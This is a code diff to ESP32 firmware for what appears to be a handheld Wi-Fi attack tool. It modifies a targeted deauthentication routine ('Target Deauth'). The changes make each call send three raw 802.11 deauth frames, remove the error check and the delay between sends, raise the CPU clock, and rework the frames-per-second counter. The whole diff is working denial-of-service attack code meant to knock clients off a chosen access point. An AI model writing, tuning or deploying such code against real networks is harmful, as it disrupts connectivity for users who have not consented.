@@ -46,10 +46,9 @@ wifi_ap_record_t ap_record;
 ** @brief: Broadcasts deauth frames
 ***************************************************************************************/
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    //Serial.begin(115200);
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
-    //Serial.println(" -> Sent deauth frame");
-    delay(5);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
 }
 
 
@@ -161,23 +160,22 @@ void target_atk(String tssid,String mac, uint8_t channel) {
   wsl_bypasser_send_raw_frame(&ap_record,channel);
 
   //loop com o ataque mostrando o numero de frames por segundo
-  int tmp = 0;
-  int count = 0;
+  uint32_t tmp = 0;
+  uint16_t count = 0;
   tmp=millis();
   bool redraw = true;
   delay(200);
   checkSelPress();
 
-
-
-
-
   drawMainMenu();
+  tft.setTextColor(FGCOLOR,BGCOLOR);
+  tft.setTextSize(FM);
+  setCpuFrequencyMhz(240);
   while(1) {
     if(redraw) {
       //desenhar a tela
       menu_op.deleteSprite();
-      menu_op.createSprite(WIDTH-20, HEIGHT-35);
+      menu_op.createSprite(WIDTH-12, HEIGHT-35);
       menu_op.fillRect(0,0, menu_op.width(),menu_op.height(), BGCOLOR);
       menu_op.setTextColor(TFT_RED);
       menu_op.drawCentreString("Target Deauth", menu_op.width()/2,2,SMOOTH_FONT);
@@ -186,17 +184,17 @@ void target_atk(String tssid,String mac, uint8_t channel) {
       menu_op.drawString("Channel: " + String(channel),0,38);
       menu_op.drawString(mac,0,55);
       menu_op.pushSprite(6,26);
+      menu_op.deleteSprite();
+      delay(50);
       redraw=false;
     }
     //Send frame
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-    count++;
+    count+=3; // the function above sends 3 frames each time
     // atualize counter
-    if(millis()-tmp>1000) {
-      menu_op.setCursor(0,menu_op.height()-17);
-      menu_op.fillRect(0,menu_op.height()-17, menu_op.width(),17, BGCOLOR);
-      menu_op.print("Frames: " + String(count) + "/s");
-      menu_op.pushSprite(6,26);
+    if(millis()-tmp>2000) {
+      tft.setCursor(6,HEIGHT-23);
+      tft.print("Frames: " + String(count/2) + "/s");
       count=0;
       tmp=millis();
     }
